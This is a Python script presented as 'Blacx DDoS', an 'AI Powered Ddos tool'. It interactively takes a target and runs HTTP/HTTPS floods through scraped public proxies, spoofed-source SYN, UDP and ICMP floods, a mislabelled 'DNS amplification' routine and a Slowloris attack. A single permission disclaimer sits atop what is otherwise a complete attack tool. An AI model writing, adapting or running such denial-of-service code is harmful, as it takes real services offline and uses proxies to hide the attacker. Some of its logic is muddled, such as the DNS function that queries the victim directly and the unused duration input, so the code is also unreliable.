import socket
import time
import threading
import random
import requests
from urllib.parse import urlparse
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
import logging
from termcolor import colored
import os

logging.basicConfig(filename='blacx_ddos_attack.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

ASCII_LOGO = """
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗░░░░░░██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗╚██╗██╔╝░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝
██████╦╝██║░░░░░███████║██║░░╚═╝░╚███╔╝░█████╗██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══██╗██║░░░░░██╔══██║██║░░██╗░██╔██╗░╚════╝██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╦╝███████╗██║░░██║╚█████╔╝██╔╝╚██╗░░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                 An AI Powered Ddos tool Created by Team-Blacx
"""
RECOMMENDATIONS = """
Recommendations:
1. Use this tool only for testing on systems you own or have explicit permission to test.
2. Analyze logs to enhance security.
3. Use proxy lists for HTTP/HTTPS attacks to increase efficiency.
"""
PROXY_SOURCES = [
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://free-proxy-list.net/",
]
def collect_proxies():
    """Collect proxies from public sources."""
    proxies = []
    print(colored("Collecting proxies from public sources...", "cyan"))
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=10)
            proxies += response.text.splitlines()
            print(colored(f"Collected {len(proxies)} proxies from {source}", "green"))
        except requests.RequestException as e:
            logging.error(f"Error collecting proxies from {source}: {e}")
            print(colored(f"Failed to collect proxies from {source}", "red"))
    return proxies

def validate_proxies(proxies):
    """Validate collected proxies."""
    alive_proxies = []
    print(colored("Validating proxies...", "cyan"))

    def check_proxy(proxy):
        try:
            response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
            if response.status_code == 200:
                alive_proxies.append(proxy)
                print(colored(f"Proxy alive: {proxy}", "green"))
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=200) as executor:
        executor.map(check_proxy, proxies)

    print(colored(f"Total alive proxies: {len(alive_proxies)}", "yellow"))
    return alive_proxies

def save_proxies_to_file(proxies):
    """Save valid proxies to proxy.txt."""
    if proxies:
        with open('proxy.txt', 'w') as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        print(colored("Proxies saved to proxy.txt", "green"))
    else:
        print(colored("No valid proxies to save.", "red"))

def send_http_request(target_url, proxy, is_post, headers, data, retries=3, backoff_factor=1.5):
    """Send HTTP/HTTPS requests with retries and exponential backoff."""
    attempt = 0
    while attempt < retries:
        try:
            if is_post:
                response = requests.post(target_url, headers=headers, data=data, proxies={"http": proxy, "https": proxy}, timeout=5)
            else:
                response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)

            if response.status_code == 200:
                logging.info(f"Request to {target_url} via proxy {proxy} succeeded.")
                print(colored(f"Request via proxy {proxy} succeeded.", "green"))
                return True
            else:
                logging.warning(f"Unexpected status code {response.status_code} via proxy {proxy}")
                print(colored(f"Unexpected status code {response.status_code} via proxy {proxy}", "yellow"))
        except requests.Timeout:
            logging.error(f"Timeout error while using proxy {proxy}")
            print(colored(f"Request via proxy {proxy} failed: Timeout error", "red"))
        except requests.ConnectionError:
            logging.error(f"Connection error while using proxy {proxy}")
            print(colored(f"Request via proxy {proxy} failed: Connection error", "red"))
        except requests.RequestException as e:
            logging.error(f"Request failed via proxy {proxy}: {str(e)}")
            print(colored(f"Request via proxy {proxy} failed: {str(e)}", "red"))

        time.sleep(backoff_factor ** attempt)
        attempt += 1
    return False

def advanced_http_flood(target_url, packet_count, rate, proxies, is_post=False):
    """Perform an HTTP/HTTPS flood attack with rotating proxies."""
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64)',
        ]),
        'Referer': f'https://{urlparse(target_url).netloc}',
    }
    data = "X" * random.randint(10240, 20480)
    with ThreadPoolExecutor(max_workers=2000) as executor:
        for i in range(packet_count):
            proxy = random.choice(proxies) if proxies else None
            executor.submit(send_http_request, target_url, proxy, is_post, headers, data)
            if i % 100 == 0:
                print(colored(f"HTTP Flood Progress: {i}/{packet_count} packets sent", "cyan"))
            time.sleep(rate)

def syn_flood(target_ip, packet_count, rate, port=80):
    """Perform a SYN flood attack."""
    syn_packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=port, flags="S")
    for i in range(packet_count):
        send(syn_packet, verbose=0)
        if i % 100 == 0:
            print(colored(f"SYN Flood Progress: {i}/{packet_count} packets sent", "cyan"))
        time.sleep(rate)

def udp_flood(target_ip, packet_count, rate, port=80):
    """Perform a UDP flood attack."""
    udp_packet = IP(src=RandIP(), dst=target_ip) / UDP(dport=port) / Raw(b"X" * random.randint(1024, 2048))
    for i in range(packet_count):
        send(udp_packet, verbose=0)
        if i % 100 == 0:
            print(colored(f"UDP Flood Progress: {i}/{packet_count} packets sent", "cyan"))
        time.sleep(rate)

def dns_amplification(target_ip, packet_count, rate):
    """Perform a DNS amplification attack."""
    dns_request = IP(src=RandIP(), dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
    for i in range(packet_count):
        send(dns_request, verbose=0)
        if i % 100 == 0:
            print(colored(f"DNS Amplification Progress: {i}/{packet_count} packets sent", "cyan"))
        time.sleep(rate)

def icmp_flood(target_ip, packet_count, rate):
    """Perform an ICMP Echo Request (Ping) flood."""
    icmp_packet = IP(src=RandIP(), dst=target_ip) / ICMP()
    for i in range(packet_count):
        send(icmp_packet, verbose=0)
        if i % 100 == 0:
            print(colored(f"ICMP Flood Progress: {i}/{packet_count} packets sent", "cyan"))
        time.sleep(rate)

def slowloris(target_url, duration=60):
    """Perform a Slowloris attack to keep connections open and exhaust server resources."""
    print(colored("Starting Slowloris attack...", "yellow"))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((urlparse(target_url).hostname, 80))
    sock.send(b"GET / HTTP/1.1\r\n")
    sock.send(b"Host: " + bytes(urlparse(target_url).hostname, "utf-8") + b"\r\n")
    sock.send(b"Content-Length: 1000000\r\n")
    sock.send(b"Connection: Keep-Alive\r\n")
    sock.send(b"\r\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        sock.send(b"X" * 10000) 
        time.sleep(10)
    sock.close()

def distribute_attack(target_url, attack_type, packet_count, rate, proxies, is_post=False, port=80, target_ip=None):
    """Distribute and execute selected attacks."""
    if attack_type == "HTTP" or attack_type == "HTTPS":
        advanced_http_flood(target_url, packet_count, rate, proxies, is_post)
    elif attack_type == "SYN":
        if not target_ip:
            target_ip = socket.gethostbyname(urlparse(target_url).netloc)
        syn_flood(target_ip, packet_count, rate, port)
    elif attack_type == "UDP":
        if not target_ip:
            target_ip = socket.gethostbyname(urlparse(target_url).netloc)
        udp_flood(target_ip, packet_count, rate, port)
    elif attack_type == "DNS":
        if not target_ip:
            target_ip = socket.gethostbyname(urlparse(target_url).netloc)
        dns_amplification(target_ip, packet_count, rate)
    elif attack_type == "ICMP":
        if not target_ip:
            target_ip = socket.gethostbyname(urlparse(target_url).netloc)
        icmp_flood(target_ip, packet_count, rate)
    elif attack_type == "SLOWLORIS":
        slowloris(target_url, duration=packet_count)
    else:
        print(colored("Invalid attack type selected.", "red"))

    logging.info("Attack completed.")
    print(colored("Attack completed.", "green"))

def main():
    print(colored(ASCII_LOGO, "cyan"))
    print(colored(RECOMMENDATIONS, "yellow"))
    target_url = input("Enter the target URL: ")
    target_ip = socket.gethostbyname(urlparse(target_url).hostname)
    print(f"Resolved IP address of {target_url}: {target_ip}")

    ip_attack_choice = input("Do you want to attack an IP address directly? (yes/no): ").lower()
    
    if ip_attack_choice == "yes":
        print(f"Attacking the IP address: {target_ip}")
    else:
        print(f"Proceeding with URL: {target_url}")
    
    attack_type = input("Choose attack type (HTTP, HTTPS, SYN, UDP, DNS, ICMP, SLOWLORIS): ").upper()

    duration = int(input("Enter the duration of the attack (in seconds): "))
    packet_count = int(input("Enter the number of packets to send: "))
    rate = float(input("Enter the rate of sending packets (seconds): "))
    port = int(input("Enter the target port (default 80): ")) if attack_type in ["SYN", "UDP"] else 80
    proxy_choice = input("Do you want to use proxies? (yes/no): ").lower() == "yes"

    proxies = []
    if proxy_choice:
        proxies = validate_proxies(collect_proxies())
        if not proxies:
            print(colored("No alive proxies available.", "red"))
            proxy_add_choice = input("Do you want to add proxies manually or continue without proxies? (add/continue): ").lower()
            if proxy_add_choice == "add":
                manual_proxies = input("Enter proxies separated by commas: ").split(",")
                proxies = validate_proxies(manual_proxies)
                if not proxies:
                    print(colored("No valid proxies were added.", "red"))
                    print(colored("Proceeding without proxies (not recommended).", "yellow"))
            else:
                print(colored("Proceeding without proxies (not recommended).", "yellow"))
    
    save_proxies_to_file(proxies)

    distribute_attack(target_url, attack_type, packet_count, rate, proxies, port=port, target_ip=target_ip)

if __name__ == "__main__":
    main()

